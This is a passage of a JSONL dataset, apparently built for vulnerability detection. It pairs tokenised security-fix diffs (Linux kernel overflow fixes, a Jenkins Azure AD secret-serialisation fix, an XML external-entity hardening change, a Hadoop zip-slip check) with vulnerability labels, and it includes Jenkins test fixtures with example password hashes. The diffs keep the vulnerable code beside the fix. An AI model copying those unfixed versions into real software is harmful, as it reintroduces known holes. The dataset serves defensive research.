">", "<", "slaveAgentPort", ">", "0", "<", "/", "slaveAgentPort", ">", "<", "label", ">", "</", "label", ">", "<", "nodeProperties", "/", ">", "<", "globalNodeProperties", "/", ">", "<", "disabledAdministrativeMonitors", "/", ">", "<", "noUsageStatistics", ">", "true", "<", "/", "noUsageStatistics", ">", "<", "/", "hudson", ">", "@", "@", "-", "0", ",", "0", "+", "1", ",", "16", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "project", ">", "<", "actions", "/", ">", "<", "description", ">", "</", "description", ">", "<", "keepDependencies", ">", "false", "<", "/", "keepDependencies", ">", "<", "properties", "/", ">", "<", "scm", "class", "=", "\"", "hudson", ".", "scm", ".", "NullSCM", "\"", "/>", "<", "canRoam", ">", "true", "<", "/", "canRoam", ">", "<", "disabled", ">", "false", "<", "/", "disabled", ">", "<", "blockBuildWhenUpstreamBuilding", ">", "false", "<", "/", "blockBuildWhenUpstreamBuilding", ">", "<", "triggers", "class", "=", "\"", "vector", "\"", "/>", "<", "concurrentBuild", ">", "false", "<", "/", "concurrentBuild", ">", "<", "builders", "/", ">", "<", "publishers", "/", ">", "<", "buildWrappers", "/", ">", "<", "/", "project", ">", "\\", "No", "newline", "at", "end", "of", "file", "@", "@", "-", "0", ",", "0", "+", "1", "@", "@", "bd50c69c18335c3c4a3280f5444c4d87469b42e1b4766ac2af4dac530ab6f8cf", "\\", "No", "newline", "at", "end", "of", "file", "@", "@", "-", "0", ",", "0", "+", "1", ",", "21", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "fullName", ">", "bob", "<", "/", "fullName", ">", "<", "properties", ">", "<", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "primaryViewName", ">", "All", "<", "/", "primaryViewName", ">", "<", "views", ">", "<", "hudson", ".", "model", ".", "AllView", ">", "<", "owner", "class", "=", "\"", "hudson", ".", "model", ".", "MyViewsProperty", "\"", "reference", "=", "\".", "./", "..", "/.", ".\"", "/>", "<", "name", ">", "All", "<", "/", "name", ">", "<", "/", "hudson", ".", "model", ".", "AllView", ">", "<", "/", "views", ">", "<", "/", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "passwordHash", ">", "zNMhSw", ":", "2d42c2730e9b405dcf091e33e4269e7fa2ae8020d167abc60a1cdc0112d72d7a", "<", "/", "passwordHash", ">", "<", "/", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "hudson", ".", "tasks", ".", "Mailer_", "-", "UserProperty", ">", "<", "emailAddress", ">", "bob", "@", "example", ".", "com", "<", "/", "emailAddress", ">", "<", "/", "hudson", ".", "tasks", ".", "Mailer_", "-", "UserProperty", ">", "<", "/", "properties", ">", "<", "/", "user", ">", "\\", "No", "newline", "at", "end", "of", "file", "@", "@", "-", "0", ",", "0", "+", "1", ",", "21", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "fullName", ">", "charlie", "<", "/", "fullName", ">", "<", "properties", ">", "<", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "primaryViewName", ">", "All", "<", "/", "primaryViewName", ">", "<", "views", ">", "<", "hudson", ".", "model", ".", "AllView", ">", "<", "owner", "class", "=", "\"", "hudson", ".", "model", ".", "MyViewsProperty", "\"", "reference", "=", "\".", "./", "..", "/.", ".\"", "/>", "<", "name", ">", "All", "<", "/", "name", ">", "<", "/", "hudson", ".", "model", ".", "AllView", ">", "<", "/", "views", ">", "<", "/", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "passwordHash", ">", "qxVPYr", ":", "8ed58e55b0b6146641e2a740363ff3678ad15cc8043c3258592314eaf79719d5", "<", "/", "passwordHash", ">", "<", "/", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "hudson", ".", "tasks", ".", "Mailer_", "-", "UserProperty", ">", "<", "emailAddress", ">", "charlie", "@", "example", ".", "com", "<", "/", "emailAddress", ">", "<", "/", "hudson", ".", "tasks", ".", "Mailer_", "-", "UserProperty", ">", "<", "/", "properties", ">", "<", "/", "user", ">", "\\", "No", "newline", "at", "end", "of", "file", "@", "@", "-", "0", ",", "0", "+", "1", ",", "21", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "fullName", ">", "admin", "<", "/", "fullName", ">", "<", "properties", ">", "<", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "primaryViewName", ">", "All", "<", "/", "primaryViewName", ">", "<", "views", ">", "<", "hudson", ".", "model", ".", "AllView", ">", "<", "owner", "class", "=", "\"", "hudson", ".", "model", ".", "MyViewsProperty", "\"", "reference", "=", "\".", "./", "..", "/.", ".\"", "/>", "<", "name", ">", "All", "<", "/", "name", ">", "<", "/", "hudson", ".", "model", ".", "AllView", ">", "<", "/", "views", ">", "<", "/", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "passwordHash", ">", "VxooAI", ":", "dfee980f5a932f67590bd6e99623fcfe4c14beb01dc031440925207c9233b1be", "<", "/", "passwordHash", ">", "<", "/", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "hudson", ".", "tasks", ".", "Mailer_", "-", "UserProperty", ">", "<", "emailAddress", ">", "admin", "@", "example", ".", "com", "<", "/", "emailAddress", ">", "<", "/", "hudson", ".", "tasks", ".", "Mailer_", "-", "UserProperty", ">", "<", "/", "properties", ">", "<", "/", "user", ">", "\\", "No", "newline", "at", "end", "of", "file", "@", "@", "-", "0", ",", "0", "+", "1", ",", "21", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "0", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "user", ">", "<", "fullName", ">", "alice", "<", "/", "fullName", ">", "<", "properties", ">", "<", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "primaryViewName", ">", "All", "<", "/", "primaryViewName", ">", "<", "views", ">", "<", "hudson", ".", "model", ".", "AllView", ">", "<", "owner", "class", "=", "\"", "hudson", ".", "model", ".", "MyViewsProperty", "\"", "reference", "=", "\".", "./", "..", "/.", ".\"", "/>", "<", "name", ">", "All", "<", "/", "name", ">", "<", "/", "hudson", ".", "model", ".", "AllView", ">", "<", "/", "views", ">", "<", "/", "hudson", ".", "model", ".", "MyViewsProperty", ">", "<", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "passwordHash", ">", "hWlWwy", ":", "dd85aa451f437bd739f2ee7f958cd22d28b746dd62bf9caf0a369925169145b6", "<", "/", "passwordHash", ">", "<", "/", "hudson", ".", "security", ".", "HudsonPrivateSecurityRealm_", "-", "Details", ">", "<", "hudson", ".", "tasks", ".", "Mailer_", "-", "UserProperty", ">", "<", "emailAddress", ">", "alice", "@", "example", ".", "com", "<", "/", "emailAddress", ">", "<", "/", "hudson", ".", "tasks", ".", "Mailer_", "-", "UserProperty", ">", "<", "/", "properties", ">", "<", "/", "user", ">", "\\", "No", "newline", "at", "end", "of", "file", "@", "@", "-", "0", ",", "0", "+", "1", ",", "21", "@", "@", "<", "?", "xml", "version", "=", "'", "1", ".", "1", "'", "encoding", "=", "'", "UTF", "-", "8", "'", "?>", "<", "hudson", ".", "model", ".", "UserIdMapper", ">", "<", "idToDirectoryNameMap", ">", "<", "entry", ">", "<", "string", ">", "admin", "<", "/", "string", ">", "<", "string", ">", "user4975613142751794216", "<", "/", "string", ">", "<", "/", "entry", ">", "<", "entry", ">", "<", "string", ">", "alice", "<", "/", "string", ">", "<", "string", ">", "user8888888888888888888", "<", "/", "string", ">", "<", "/", "entry", ">", "<", "entry", ">", "<", "string", ">", "bob", "<", "/", "string", ">", "<", "string", ">", "user11111111111111", "<", "/", "string", ">", "<", "/", "entry", ">", "<", "entry", ">", "<", "string", ">", "charlie", "<", "/", "string", ">", "<", "string", ">", "user2222222222222", "<", "/", "string", ">", "<", "/", "entry", ">", "<", "/", "idToDirectoryNameMap", ">", "<", "/", "hudson", ".", "model", ".", "UserIdMapper", ">"], "docstring_tokens": ["data", "modification"]}
{"contents": ["vfs:", "ioctl:", "prevent", "double-fetch", "in", "dedupe", "ioctl", "This", "prevents", "a", "double-fetch", "from", "user", "space", "that", "can", "lead", "to", "to", "an", "undersized", "allocation", "and", "heap", "overflow.", "Fixes:", "54dbc1517237", "(\"vfs:", "hoist", "the", "btrfs", "deduplication", "ioctl", "to", "the", "vfs\")", "Signed-off-by:", "Scott", "Bauer", "<sbauer@plzdonthack.me>", "Signed-off-by:", "Linus", "Torvalds", "<torvalds@linux-foundation.org>"], "code_tokens": ["@", "@", "-", "590", ",", "6", "+", "590", ",", "7", "@", "@", "static", "long", "ioctl_file_dedupe_range", "(", "struct", "file", "*", "file", ",", "void", "__user", "*", "arg", ")", "goto", "out", ";", "}", "same", "-", ">", "dest_count", "=", "count", ";", "ret", "=", "vfs_dedupe_file_range", "(", "file", ",", "same", ")", ";", "if", "(", "ret", ")", "goto", "out", ";"], "docstring_tokens": ["buffer", "overflow"]}
{"contents": ["[SECURITY-1390]"], "code_tokens": ["@", "@", "-", "132", ",", "6", "+", "132", ",", "12", "@", "@", "<", "version", ">", "4", ".", "5", ".", "7", "<", "/", "version", ">", "<", "/", "dependency", ">", "<", "dependency", ">", "<", "groupId", ">", "junit", "<", "/", "groupId", ">", "<", "artifactId", ">", "junit", "<", "/", "artifactId", ">", "<", "version", ">", "4", ".", "12", "<", "/", "version", ">", "<", "scope", ">", "test", "<", "/", "scope", ">", "<", "/", "dependency", ">", "<", "!-", "-", "fix", "the", "requireUpperBounds", "errors", "-", "->", "<", "dependency", ">", "<", "groupId", ">", "commons", "-", "codec", "<", "/", "groupId", ">", "@", "@", "-", "305", ",", "7", "+", "305", ",", "7", "@", "@", "public", "void", "marshal", "(", "Object", "source", ",", "HierarchicalStreamWriter", "writer", ",", "MarshallingC", "writer", ".", "endNode", "(", ");", "writer", ".", "startNode", "(", "\"", "clientsecret", "\"", ");", "writer", ".", "setValue", "(", "realm", ".", "getClientSecret", "(", "))", ";", "writer", ".", "setValue", "(", "realm", ".", "getClientSecretSecret", "(", "))", ";", "writer", ".", "endNode", "(", ");", "writer", ".", "startNode", "(", "\"", "tenant", "\"", ");", "@", "@", "-", "1", ",", "4", "+", "1", ",", "71", "@", "@", "package", "com", ".", "microsoft", ".", "jenkins", ".", "azuread", ";", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "io", ".", "binary", ".", "BinaryStreamReader", ";", "import", "com", ".", "thoughtworks", ".", "xstream", ".", "io", ".", "binary", ".", "BinaryStreamWriter", ";", "import", "org", ".", "apache", ".", "commons", ".", "io", ".", "output", ".", "ByteArrayOutputStream", ";", "import", "org", ".", "junit", ".", "Assert", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Rule", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "JenkinsRule", ";", "import", "java", ".", "io", ".", "ByteArrayInputStream", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "concurrent", ".", "ExecutionException", ";", "public", "class", "AzureSecurityRealmTest", "{", "@", "Rule", "public", "JenkinsRule", "j", "=", "new", "JenkinsRule", "(", ");", "@", "Before", "public", "void", "init", "(", ")", "throws", "Exception", "{", "j", ".", "recipe", "(", ");", "}", "@", "Test", "public", "void", "testConverter", "(", ")", "throws", "InterruptedException", ",", "ExecutionException", ",", "IOException", "{", "BinaryStreamWriter", "writer", "=", "null", ";", "BinaryStreamReader", "reader", "=", "null", ";", "try", "{", "AzureSecurityRealm", "securityRealm", "=", "new", "AzureSecurityRealm", "(", "\"", "tenant", "\"", ",", "\"", "clientId", "\"", ",", "\"", "secret", "\"", ");", "AzureSecurityRealm", ".", "ConverterImpl", "converter", "=", "new", "AzureSecurityRealm", ".", "ConverterImpl", "(", ");", "ByteArrayOutputStream", "outputStream", "=", "new", "ByteArrayOutputStream", "(", ");", "writer", "=", "new", "BinaryStreamWriter", "(", "outputStream", ")", ";", "writer", ".", "startNode", "(", "\"", "parentNode", "\"", ");", "converter", ".", "marshal", "(", "securityRealm", ",", "writer", ",", "null", ")", ";", "writer", ".", "endNode", "(", ");", "byte", "[", "]", "bytes", "=", "outputStream", ".", "toByteArray", "(", ");", "reader", "=", "new", "BinaryStreamReader", "(", "new", "ByteArrayInputStream", "(", "bytes", ")", ");", "AzureSecurityRealm", "result", "=", "(", "AzureSecurityRealm", ")", "converter", ".", "unmarshal", "(", "reader", ",", "null", ")", ";", "Assert", ".", "assertEquals", "(", "securityRealm", ".", "getTenant", "(", "),", "result", ".", "getTenant", "(", "))", ";", "Assert", ".", "assertEquals", "(", "securityRealm", ".", "getClientId", "(", "),", "result", ".", "getClientId", "(", "))", ";", "Assert", ".", "assertEquals", "(", "securityRealm", ".", "getClientSecret", "(", "),", "result", ".", "getClientSecret", "(", "))", ";", "}", "finally", "{", "if", "(", "writer", "!", "=", "null", ")", "{", "writer", ".", "close", "(", ");", "}", "if", "(", "reader", "!", "=", "null", ")", "{", "reader", ".", "close", "(", ");", "}", "}", "}", "@", "Test", "public", "void", "testSavedConfig", "(", ")", "throws", "InterruptedException", ",", "ExecutionException", ",", "IOException", "{", "BinaryStreamWriter", "writer", "=", "null", ";", "try", "{", "String", "secretString", "=", "\"", "thisIsSpecialSecret", "\"", ";", "AzureSecurityRealm", "securityRealm", "=", "new", "AzureSecurityRealm", "(", "\"", "tenant", "\"", ",", "\"", "clientId", "\"", ",", "secretString", ")", ";", "AzureSecurityRealm", ".", "ConverterImpl", "converter", "=", "new", "AzureSecurityRealm", ".", "ConverterImpl", "(", ");", "ByteArrayOutputStream", "outputStream", "=", "new", "ByteArrayOutputStream", "(", ");", "writer", "=", "new", "BinaryStreamWriter", "(", "outputStream", ")", ";", "converter", ".", "marshal", "(", "securityRealm", ",", "writer", ",", "null", ")", ";", "Assert", ".", "assertFalse", "(", "outputStream", ".", "toString", "(", ").", "contains", "(", "secretString", ")", ");", "}", "finally", "{", "if", "(", "writer", "!", "=", "null", ")", "{", "writer", ".", "close", "(", ");", "}", "}", "}", "}"], "docstring_tokens": ["cross-site", "request", "forgery"]}
{"contents": ["x86-64,", "compat:", "Retruncate", "rax", "after", "ia32", "syscall", "entry", "tracing", "In", "commit", "d4d6715,", "we", "reopened", "an", "old", "hole", "for", "a", "64-bit", "ptracer", "touching", "a", "32-bit", "tracee", "in", "system", "call", "entry.", "A", "%rax", "value", "set", "via", "ptrace", "at", "the", "entry", "tracing", "stop", "gets", "used", "whole", "as", "a", "32-bit", "syscall", "number,", "while", "we", "only", "check", "the", "low", "32", "bits", "for", "validity.", "Fix", "it", "by", "truncating", "%rax", "back", "to", "32", "bits", "after", "syscall_trace_enter,", "in", "addition", "to", "testing", "the", "full", "64", "bits", "as", "has", "already", "been", "added.", "Reported-by:", "Ben", "Hawkes", "<hawkes@sota.gen.nz>", "Signed-off-by:", "Roland", "McGrath", "<roland@redhat.com>", "Signed-off-by:", "H.", "Peter", "Anvin", "<hpa@linux.intel.com>"], "code_tokens": ["@", "@", "-", "50", ",", "7", "+", "50", ",", "12", "@", "@", "/", "*", "*", "Reload", "arg", "registers", "from", "stack", "in", "case", "ptrace", "changed", "them", ".", "*", "We", "don", "'", "t", "reload", "%", "eax", "because", "syscall_trace_enter", "(", ")", "returned", "*", "the", "value", "it", "wants", "us", "to", "use", "in", "the", "table", "lookup", ".", "*", "the", "%", "rax", "value", "we", "should", "see", ".", "Instead", ",", "we", "just", "truncate", "that", "*", "value", "to", "32", "bits", "again", "as", "we", "did", "on", "entry", "from", "user", "mode", ".", "*", "If", "it", "'", "s", "a", "new", "value", "set", "by", "user_regset", "during", "entry", "tracing", ",", "*", "this", "matches", "the", "normal", "truncation", "of", "the", "user", "-", "mode", "value", ".", "*", "If", "it", "'", "s", "-", "1", "to", "make", "us", "punt", "the", "syscall", ",", "then", "(", "u32", ")", "-", "1", "is", "still", "*", "an", "appropriately", "invalid", "value", ".", "*", "/", ".", "macro", "LOAD_ARGS32", "offset", ",", "_r9", "=", "0", ".", "if", "\\", "_r9", "@", "@", "-", "60", ",", "6", "+", "65", ",", "7", "@", "@", "movl", "\\", "offset", "+", "48", "(", "%", "rsp", ")", ",%", "edx", "movl", "\\", "offset", "+", "56", "(", "%", "rsp", ")", ",%", "esi", "movl", "\\", "offset", "+", "64", "(", "%", "rsp", ")", ",%", "edi", "movl", "%", "eax", ",", "%", "eax", "/", "*", "zero", "extension", "*", "/", ".", "endm", ".", "macro", "CFI_STARTPROC32", "simple"], "docstring_tokens": ["out-of-bounds", "access"]}
{"contents": ["Ensuring", "all", "XML", "input", "processing", "is", "safe", "-", "disable", "DTD", "and", "external", "entities"], "code_tokens": ["@", "@", "-", "32", ",", "10", "+", "32", ",", "15", "@", "@", "public", "final", "class", "ReconciliationReportParser", "{", "private", "static", "final", "XMLInputFactory", "INPUT_FACTORY", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "private", "static", "final", "XMLInputFactory", "XML_INPUT_FACTORY", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "static", "{", "XML_INPUT_FACTORY", ".", "setProperty", "(", "XMLInputFactory", ".", "IS_SUPPORTING_EXTERNAL_ENTITIES", ",", "Boolean", ".", "FALSE", ")", ";", "XML_INPUT_FACTORY", ".", "setProperty", "(", "XMLInputFactory", ".", "SUPPORT_DTD", ",", "Boolean", ".", "FALSE", ")", ";", "}", "public", "static", "ReconciliationReport", "parse", "(", "final", "Date", "run", ",", "final", "InputStream", "in", ")", "throws", "XMLStreamException", "{", "XMLStreamReader", "streamReader", "=", "INPUT_FACTORY", ".", "createXMLStreamReader", "(", "in", ")", ";", "XMLStreamReader", "streamReader", "=", "XML_INPUT_FACTORY", ".", "createXMLStreamReader", "(", "in", ")", ";", "streamReader", ".", "nextTag", "(", ");", "/", "/", "root", "streamReader", ".", "nextTag", "(", ");", "/", "/", "report", "streamReader", ".", "nextTag", "(", ");", "/", "/", "reportlet", "@", "@", "-", "41", ",", "6", "+", "41", ",", "13", "@", "@", "private", "static", "final", "ObjectMapper", "OBJECT_MAPPER", "=", "new", "ObjectMapper", "(", ");", "private", "static", "final", "XMLInputFactory", "XML_INPUT_FACTORY", "=", "XMLInputFactory", ".", "newInstance", "(", ");", "static", "{", "XML_INPUT_FACTORY", ".", "setProperty", "(", "XMLInputFactory", ".", "IS_SUPPORTING_EXTERNAL_ENTITIES", ",", "Boolean", ".", "FALSE", ")", ";", "XML_INPUT_FACTORY", ".", "setProperty", "(", "XMLInputFactory", ".", "SUPPORT_DTD", ",", "Boolean", ".", "FALSE", ")", ";", "}", "public", "static", "Deployment", "deployDefinition", "(", "final", "ProcessEngine", "engine", ",", "final", "String", "resourceName", ",", "final", "byte", "[", "]", "definition", ")", "{", "@", "@", "-", "58", ",", "7", "+", "65", ",", "7", "@", "@", "public", "static", "void", "deployModel", "(", "final", "ProcessEngine", "engine", ",", "final", "ProcessDefiniti", "getResourceAsStream", "(", "procDef", ".", "getDeploymentId", "(", "),", "procDef", ".", "getResourceName", "(", "))", ";", "InputStreamReader", "isr", "=", "new", "InputStreamReader", "(", "bpmnStream", ")", ")", "{", "xtr", "=", "XMLInputFactory", ".", "newInstance", "(", ").", "createXMLStreamReader", "(", "isr", ")", ";", "xtr", "=", "XML_INPUT_FACTORY", ".", "createXMLStreamReader", "(", "isr", ")", ";", "BpmnModel", "bpmnModel", "=", "new", "BpmnXMLConverter", "(", ").", "convertToBpmnModel", "(", "xtr", ")", ";", "Model", "model", "=", "engine", ".", "getRepositoryService", "(", ").", "newModel", "(", ");", "@", "@", "-", "18", ",", "16", "+", "18", ",", "14", "@", "@", "*", "/", "package", "org", ".", "apache", ".", "syncope", ".", "core", ".", "flowable", ".", "support", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "javax", ".", "sql", ".", "DataSource", ";", "import", "org", ".", "apache", ".", "commons", ".", "lang3", ".", "StringUtils", ";", "import", "org", ".", "flowable", ".", "engine", ".", "ProcessEngine", ";", "import", "org", ".", "flowable", ".", "common", ".", "engine", ".", "impl", ".", "cfg", ".", "SpringBeanFactoryProxyMap", ";", "import", "org", ".", "flowable", ".", "common", ".", "engine", ".", "impl", ".", "interceptor", ".", "EngineConfigurationConstants", ";", "import", "org", ".", "flowable", ".", "engine", ".", "form", ".", "AbstractFormType", ";", "import", "org", ".", "flowable", ".", "engine", ".", "impl", ".", "util", ".", "EngineServiceUtil", ";", "import", "org", ".", "flowable", ".", "idm", ".", "spring", ".", "SpringIdmEngineConfiguration", ";", "import", "org", ".", "flowable", ".", "spring", ".", "SpringExpressionManager", ";", "@", "@", "-", "84", ",", "9", "+", "82", ",", "8", "@", "@", "public", "DomainProcessEngine", "getObject", "(", ")", "throws", "Exception", "{", "EngineConfigurationConstants", ".", "KEY_IDM_ENGINE_CONFIG", ",", "ctx", ".", "getBean", "(", "SpringIdmEngineConfiguration", ".", "class", ")", ");", "}", "List", "<", "AbstractFormType", ">", "customFormTypes", "=", "new", "ArrayList", "<", ">(", ");", "customFormTypes", ".", "add", "(", "new", "DropdownFormType", "(", "null", ")", ");", "conf", ".", "setCustomFormTypes", "(", "customFormTypes", ")", ";", "conf", ".", "setEnableSafeBpmnXml", "(", "true", ")", ";", "conf", ".", "setCustomFormTypes", "(", "Arrays", ".", "asList", "(", "new", "DropdownFormType", "(", "null", ")", "))", ";", "engines", ".", "put", "(", "domain", ",", "conf", ".", "buildProcessEngine", "(", "))", ";", "}"], "docstring_tokens": ["xml", "external", "entity"]}
{"contents": ["net:", "sock:", "validate", "data_len", "before", "allocating", "skb", "in", "sock_alloc_send_pskb()", "We", "need", "to", "validate", "the", "number", "of", "pages", "consumed", "by", "data_len,", "otherwise", "frags", "array", "could", "be", "overflowed", "by", "userspace.", "So", "this", "patch", "validate", "data_len", "and", "return", "-EMSGSIZE", "when", "data_len", "may", "occupies", "more", "frags", "than", "MAX_SKB_FRAGS.", "Signed-off-by:", "Jason", "Wang", "<jasowang@redhat.com>", "Signed-off-by:", "David", "S.", "Miller", "<davem@davemloft.net>"], "code_tokens": ["@", "@", "-", "1592", ",", "6", "+", "1592", ",", "11", "@", "@", "struct", "sk_buff", "*", "sock_alloc_send_pskb", "(", "struct", "sock", "*", "sk", ",", "unsigned", "long", "header_len", ",", "gfp_t", "gfp_mask", ";", "long", "timeo", ";", "int", "err", ";", "int", "npages", "=", "(", "data_len", "+", "(", "PAGE_SIZE", "-", "1", ")", ")", ">", ">", "PAGE_SHIFT", ";", "err", "=", "-", "EMSGSIZE", ";", "if", "(", "npages", ">", "MAX_SKB_FRAGS", ")", "goto", "failure", ";", "gfp_mask", "=", "sk", "-", ">", "sk_allocation", ";", "if", "(", "gfp_mask", "&", "__GFP_WAIT", ")", "@", "@", "-", "1610", ",", "14", "+", "1615", ",", "12", "@", "@", "struct", "sk_buff", "*", "sock_alloc_send_pskb", "(", "struct", "sock", "*", "sk", ",", "unsigned", "long", "header_len", ",", "if", "(", "atomic_read", "(", "&", "sk", "-", ">", "sk_wmem_alloc", ")", "<", "sk", "-", ">", "sk_sndbuf", ")", "{", "skb", "=", "alloc_skb", "(", "header_len", ",", "gfp_mask", ")", ";", "if", "(", "skb", ")", "{", "int", "npages", ";", "int", "i", ";", "/", "*", "No", "pages", ",", "we", "'", "re", "done", ".", "..", "*", "/", "if", "(", "!", "data_len", ")", "break", ";", "npages", "=", "(", "data_len", "+", "(", "PAGE_SIZE", "-", "1", ")", ")", ">", ">", "PAGE_SHIFT", ";", "skb", "-", ">", "truesize", "+", "=", "data_len", ";", "skb_shinfo", "(", "skb", ")", "->", "nr_frags", "=", "npages", ";", "for", "(", "i", "=", "0", ";", "i", "<", "npages", ";", "i", "+", "+)", "{"], "docstring_tokens": ["buffer", "overflow"]}
{"contents": ["Additional", "check", "when", "unpacking", "archives.", "Contributed", "by", "Jason", "Lowe", "and", "Akira", "Ajisaka."], "code_tokens": ["@", "@", "-", "587", ",", "16", "+", "587", ",", "21", "@", "@", "public", "static", "long", "getDU", "(", "File", "dir", ")", "{", "public", "static", "void", "unZip", "(", "File", "inFile", ",", "File", "unzipDir", ")", "throws", "IOException", "{", "Enumeration", "<", "?", "extends", "ZipEntry", ">", "entries", ";", "ZipFile", "zipFile", "=", "new", "ZipFile", "(", "inFile", ")", ";", "String", "targetDirPath", "=", "unzipDir", ".", "getCanonicalPath", "(", ")", "+", "File", ".", "separator", ";", "try", "{", "entries", "=", "zipFile", ".", "entries", "(", ");", "while", "(", "entries", ".", "hasMoreElements", "(", "))", "{", "ZipEntry", "entry", "=", "entries", ".", "nextElement", "(", ");", "if", "(", "!", "entry", ".", "isDirectory", "(", "))", "{", "File", "file", "=", "new", "File", "(", "unzipDir", ",", "entry", ".", "getName", "(", "))", ";", "if", "(", "!", "file", ".", "getCanonicalPath", "(", ").", "startsWith", "(", "targetDirPath", ")", ")", "{", "throw", "new", "IOException", "(", "\"", "expanding", "\"", "+", "entry", ".", "getName", "(", ")", "+", "\"", "would", "create", "file", "outside", "of", "\"", "+", "unzipDir", ")", ";", "}", "InputStream", "in", "=", "zipFile", ".", "getInputStream", "(", "entry", ")", ";", "try", "{", "File", "file", "=", "new", "File", "(", "unzipDir", ",", "entry", ".", "getName", "(", "))", ";", "if", "(", "!", "file", ".", "getParentFile", "(", ").", "mkdirs", "(", "))", "{", "if", "(", "!", "file", ".", "getParentFile", "(", ").", "mkdirs", "(", "))", "{", "if", "(", "!", "file", ".", "getParentFile", "(", ").", "isDirectory", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "Mkdirs", "failed", "to", "create", "\"", "+", "file", ".", "getParentFile", "(", ").", "toString", "(", "))", ";", "@", "@", "-", "705", ",", "6", "+", "710", ",", "13", "@", "@", "private", "static", "void", "unTarUsingJava", "(", "File", "inFile", ",", "File", "untarDir", ",", "private", "static", "void", "unpackEntries", "(", "TarArchiveInputStream", "tis", ",", "TarArchiveEntry", "entry", ",", "File", "outputDir", ")", "throws", "IOException", "{", "String", "targetDirPath", "=", "outputDir", ".", "getCanonicalPath", "(", ")", "+", "File", ".", "separator", ";", "File", "outputFile", "=", "new", "File", "(", "outputDir", ",", "entry", ".", "getName", "(", "))", ";", "if", "(", "!", "outputFile", ".", "getCanonicalPath", "(", ").", "startsWith", "(", "targetDirPath", ")", ")", "{", "throw", "new", "IOException", "(", "\"", "expanding", "\"", "+", "entry", ".", "getName", "(", ")", "+", "\"", "would", "create", "entry", "outside", "of", "\"", "+", "outputDir", ")", ";", "}", "if", "(", "entry", ".", "isDirectory", "(", "))", "{", "File", "subDir", "=", "new", "File", "(", "outputDir", ",", "entry", ".", "getName", "(", "))", ";", "if", "(", "!", "subDir", ".", "mkdirs", "(", ")", "&", "&", "!", "subDir", ".", "isDirectory", "(", "))", "{", "@", "@", "-", "719", ",", "7", "+", "731", ",", "6", "@", "@", "private", "static", "void", "unpackEntries", "(", "TarArchiveInputStream", "tis", ",", "return", ";", "}", "File", "outputFile", "=", "new", "File", "(", "outputDir", ",", "entry", ".", "getName", "(", "))", ";", "if", "(", "!", "outputFile", ".", "getParentFile", "(", ").", "exists", "(", "))", "{", "if", "(", "!", "outputFile", ".", "getParentFile", "(", ").", "mkdirs", "(", "))", "{", "throw", "new", "IOException", "(", "\"", "Mkdirs", "failed", "to", "create", "tar", "internal", "dir", "\"", "@", "@", "-", "25", ",", "8", "+", "25", ",", "9", "@", "@", "import", "java", ".", "io", ".", "FileReader", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "OutputStream", ";", "import", "java", ".", "net", ".", "URI", ";", "import", "java", ".", "io", ".", "PrintWriter", ";", "import", "java", ".", "net", ".", "URI", ";", "import", "java", ".", "nio", ".", "charset", ".", "StandardCharsets", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "Collections", ";", "@", "@", "-", "40", ",", "6", "+", "41", ",", "7", "@", "@", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "Log", ";", "import", "org", ".", "apache", ".", "commons", ".", "logging", ".", "LogFactory", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "conf", ".", "Configuration", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "test", ".", "GenericTestUtils", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "util", ".", "Shell", ";", "import", "org", ".", "apache", ".", "hadoop", ".", "util", ".", "StringUtils", ";", "import", "org", ".", "apache", ".", "tools", ".", "tar", ".", "TarEntry", ";", "@", "@", "-", "708", ",", "10", "+", "710", ",", "8", "@", "@", "public", "void", "testCreateLocalTempFile", "(", ")", "throws", "IOException", "{", "@", "Test", "(", "timeout", "=", "30000", ")", "public", "void", "testUnZip", "(", ")", "throws", "IOException", "{", "/", "/", "make", "sa", "simple", "zip", "setupDirs", "(", ");", "/", "/", "make", "a", "simple", "tar", ":", "/", "/", "make", "a", 